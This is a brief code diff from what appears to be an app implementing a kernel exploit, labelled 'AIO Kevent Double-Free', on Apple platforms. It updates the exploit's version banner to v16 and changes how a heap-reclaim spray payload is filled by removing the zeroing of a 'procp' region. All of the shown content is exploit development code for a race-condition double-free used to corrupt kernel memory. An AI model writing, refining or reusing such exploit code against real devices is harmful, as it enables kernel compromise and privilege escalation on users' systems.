@@ -5681,7 +5681,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v15 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v16 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5951,9 +5951,6 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     uint8_t *drainPayload = (uint8_t *)calloc(1, kDrainOolSize);
     if (drainPayload) {
         for (int i = 0; i < kDrainOolSize; i++) drainPayload[i] = (uint8_t)i;
-        // Zero out potential procp region to avoid kevent64 panic if used
-        // (offsets ~0x40-0x48 — set to 0 for safety)
-        memset(drainPayload + 0x40, 0, 16);
     }
 
     typedef struct {
